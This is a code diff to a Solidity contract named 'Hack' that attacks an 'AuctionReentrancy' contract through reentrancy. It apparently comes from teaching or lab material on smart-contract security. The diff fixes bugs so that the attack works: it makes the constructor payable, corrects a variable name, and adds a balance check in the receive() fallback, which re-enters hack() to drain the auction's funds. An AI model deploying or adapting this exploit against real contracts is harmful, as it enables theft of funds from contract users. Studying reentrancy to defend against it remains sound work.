@@ -32,10 +32,10 @@ contract Hack {
     AuctionReentrancy toHack;
     uint constant BID_AMOUNT = 1 ether;
 
-    constructor(address _toHack) {
+    constructor(address _toHack) payable{
         require(msg.value == BID_AMOUNT);
 
-        toHack = AuctionReentrancy(_tohack);
+        toHack = AuctionReentrancy(_toHack);
         toHack.bid{value: msg.value}();
     }
 
@@ -44,7 +44,7 @@ contract Hack {
     }
 
     receive() external payable {
-        if (address(toHack) >= BID_AMOUNT) {
+        if (address(toHack).balance >= BID_AMOUNT) {
             hack();
         }
     }
